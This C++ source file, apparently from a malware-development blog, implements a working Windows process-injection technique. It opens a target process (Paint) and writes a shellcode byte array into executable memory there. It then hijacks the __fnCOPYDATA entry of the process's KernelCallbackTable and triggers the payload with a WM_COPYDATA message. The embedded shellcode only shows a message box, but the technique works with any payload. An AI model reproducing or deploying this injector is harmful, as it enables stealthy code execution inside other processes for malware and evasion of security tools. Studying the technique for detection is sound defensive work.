/*
 * hack.cpp - process injection via KernelCallbackTable. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/
*/
#include <./ntddk.h>
#include <cstdio>
#include <cstddef>

#pragma comment(lib, "ntdll");

typedef struct _KERNELCALLBACKTABLE_T {
  ULONG_PTR __fnCOPYDATA;
  ULONG_PTR __fnCOPYGLOBALDATA;
  ULONG_PTR __fnDWORD;
  ULONG_PTR __fnNCDESTROY;
  ULONG_PTR __fnDWORDOPTINLPMSG;
  ULONG_PTR __fnINOUTDRAG;
  ULONG_PTR __fnGETTEXTLENGTHS;
  ULONG_PTR __fnINCNTOUTSTRING;
  ULONG_PTR __fnPOUTLPINT;
  ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
  ULONG_PTR __fnINLPCREATESTRUCT;
  ULONG_PTR __fnINLPDELETEITEMSTRUCT;
  ULONG_PTR __fnINLPDRAWITEMSTRUCT;
  ULONG_PTR __fnPOPTINLPUINT;
  ULONG_PTR __fnPOPTINLPUINT2;
  ULONG_PTR __fnINLPMDICREATESTRUCT;
  ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
  ULONG_PTR __fnINLPWINDOWPOS;
  ULONG_PTR __fnINOUTLPPOINT5;
  ULONG_PTR __fnINOUTLPSCROLLINFO;
  ULONG_PTR __fnINOUTLPRECT;
  ULONG_PTR __fnINOUTNCCALCSIZE;
  ULONG_PTR __fnINOUTLPPOINT5_;
  ULONG_PTR __fnINPAINTCLIPBRD;
  ULONG_PTR __fnINSIZECLIPBRD;
  ULONG_PTR __fnINDESTROYCLIPBRD;
  ULONG_PTR __fnINSTRING;
  ULONG_PTR __fnINSTRINGNULL;
  ULONG_PTR __fnINDEVICECHANGE;
  ULONG_PTR __fnPOWERBROADCAST;
  ULONG_PTR __fnINLPUAHDRAWMENU;
  ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
  ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
  ULONG_PTR __fnOUTDWORDINDWORD;
  ULONG_PTR __fnOUTLPRECT;
  ULONG_PTR __fnOUTSTRING;
  ULONG_PTR __fnPOPTINLPUINT3;
  ULONG_PTR __fnPOUTLPINT2;
  ULONG_PTR __fnSENTDDEMSG;
  ULONG_PTR __fnINOUTSTYLECHANGE;
  ULONG_PTR __fnHkINDWORD;
  ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
  ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
  ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
  ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
  ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
  ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
  ULONG_PTR __fnHkINLPMSG;
  ULONG_PTR __fnHkINLPRECT;
  ULONG_PTR __fnHkOPTINLPEVENTMSG;
  ULONG_PTR __xxxClientCallDelegateThread;
  ULONG_PTR __ClientCallDummyCallback;
  ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
  ULONG_PTR __fnOUTLPCOMBOBOXINFO;
  ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
  ULONG_PTR __xxxClientCallDevCallbackCapture;
  ULONG_PTR __xxxClientCallDitThread;
  ULONG_PTR __xxxClientEnableMMCSS;
  ULONG_PTR __xxxClientUpdateDpi;
  ULONG_PTR __xxxClientExpandStringW;
  ULONG_PTR __ClientCopyDDEIn1;
  ULONG_PTR __ClientCopyDDEIn2;
  ULONG_PTR __ClientCopyDDEOut1;
  ULONG_PTR __ClientCopyDDEOut2;
  ULONG_PTR __ClientCopyImage;
  ULONG_PTR __ClientEventCallback;
  ULONG_PTR __ClientFindMnemChar;
  ULONG_PTR __ClientFreeDDEHandle;
  ULONG_PTR __ClientFreeLibrary;
  ULONG_PTR __ClientGetCharsetInfo;
  ULONG_PTR __ClientGetDDEFlags;
  ULONG_PTR __ClientGetDDEHookData;
  ULONG_PTR __ClientGetListboxString;
  ULONG_PTR __ClientGetMessageMPH;
  ULONG_PTR __ClientLoadImage;
  ULONG_PTR __ClientLoadLibrary;
  ULONG_PTR __ClientLoadMenu;
  ULONG_PTR __ClientLoadLocalT1Fonts;
  ULONG_PTR __ClientPSMTextOut;
  ULONG_PTR __ClientLpkDrawTextEx;
  ULONG_PTR __ClientExtTextOutW;
  ULONG_PTR __ClientGetTextExtentPointW;
  ULONG_PTR __ClientCharToWchar;
  ULONG_PTR __ClientAddFontResourceW;
  ULONG_PTR __ClientThreadSetup;
  ULONG_PTR __ClientDeliverUserApc;
  ULONG_PTR __ClientNoMemoryPopup;
  ULONG_PTR __ClientMonitorEnumProc;
  ULONG_PTR __ClientCallWinEventProc;
  ULONG_PTR __ClientWaitMessageExMPH;
  ULONG_PTR __ClientWOWGetProcModule;
  ULONG_PTR __ClientWOWTask16SchedNotify;
  ULONG_PTR __ClientImmLoadLayout;
  ULONG_PTR __ClientImmProcessKey;
  ULONG_PTR __fnIMECONTROL;
  ULONG_PTR __fnINWPARAMDBCSCHAR;
  ULONG_PTR __fnGETTEXTLENGTHS2;
  ULONG_PTR __fnINLPKDRAWSWITCHWND;
  ULONG_PTR __ClientLoadStringW;
  ULONG_PTR __ClientLoadOLE;
  ULONG_PTR __ClientRegisterDragDrop;
  ULONG_PTR __ClientRevokeDragDrop;
  ULONG_PTR __fnINOUTMENUGETOBJECT;
  ULONG_PTR __ClientPrinterThunk;
  ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
  ULONG_PTR __fnOUTLPSCROLLBARINFO;
  ULONG_PTR __fnINLPUAHDRAWMENU2;
  ULONG_PTR __fnINLPUAHDRAWMENUITEM;
  ULONG_PTR __fnINLPUAHDRAWMENU3;
  ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
  ULONG_PTR __fnINLPUAHDRAWMENU4;
  ULONG_PTR __fnOUTLPTITLEBARINFOEX;
  ULONG_PTR __fnTOUCH;
  ULONG_PTR __fnGESTURE;
  ULONG_PTR __fnPOPTINLPUINT4;
  ULONG_PTR __fnPOPTINLPUINT5;
  ULONG_PTR __xxxClientCallDefaultInputHandler;
  ULONG_PTR __fnEMPTY;
  ULONG_PTR __ClientRimDevCallback;
  ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
  ULONG_PTR __ClientCallLocalMouseHooks;
  ULONG_PTR __xxxClientBroadcastThemeChange;
  ULONG_PTR __xxxClientCallDevCallbackSimple;
  ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
  ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
  ULONG_PTR __fnGETWINDOWDATA;
  ULONG_PTR __fnINOUTSTYLECHANGE2;
  ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
} KERNELCALLBACKTABLE;

// NtQueryInformationProcess
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
  IN HANDLE ProcessHandle,
  IN PROCESSINFOCLASS ProcessInformationClass,
  OUT PVOID ProcessInformation,
  IN ULONG ProcessInformationLength,
  OUT PULONG ReturnLength OPTIONAL
);

unsigned char my_payload[] = 
  
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

int main() {
  
  HANDLE ph;
  DWORD pid;
  PROCESS_BASIC_INFORMATION pbi;
  KERNELCALLBACKTABLE kct;
  COPYDATASTRUCT cds;
  PEB peb;
  WCHAR msg[] = L"kernelcallbacktable injection impl";

  // find a window for mspaint.exe
  HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
  if (hw == NULL) {
    printf("failed to find window :(\n");
    return -2;
  }
  GetWindowThreadProcessId(hw, &pid);
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  HMODULE ntdll = GetModuleHandleA("ntdll");
  pNtQueryInformationProcess myNtQueryInformationProcess = (pNtQueryInformationProcess)(GetProcAddress(ntdll, "NtQueryInformationProcess"));

  myNtQueryInformationProcess(ph, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

  ReadProcessMemory(ph, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
  ReadProcessMemory(ph, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);

  LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

  LPVOID tb = VirtualAllocEx(ph, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  kct.__fnCOPYDATA = (ULONG_PTR)rb;
  WriteProcessMemory(ph, tb, &kct, sizeof(kct), NULL);

  WriteProcessMemory(ph, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &tb, sizeof(ULONG_PTR), NULL);

  cds.dwData = 1;
  cds.cbData = lstrlen((LPCSTR)msg) * 2;
  cds.lpData = msg;

  SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);
  WriteProcessMemory(ph, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);

  VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
  VirtualFreeEx(ph, tb, 0, MEM_RELEASE);
  CloseHandle(ph);

  return 0;
}
